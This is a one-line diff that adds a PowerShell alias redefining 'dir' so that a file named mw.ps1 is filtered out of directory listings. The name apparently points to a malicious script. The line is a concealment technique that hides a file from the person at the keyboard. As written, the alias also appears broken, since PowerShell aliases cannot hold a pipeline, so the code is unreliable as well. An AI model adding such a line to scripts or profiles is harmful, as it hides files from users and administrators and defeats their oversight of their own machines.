@@ -1,0 +1,1 @@
+Set-Alias dir "dir|findstr /V mw.ps1" 
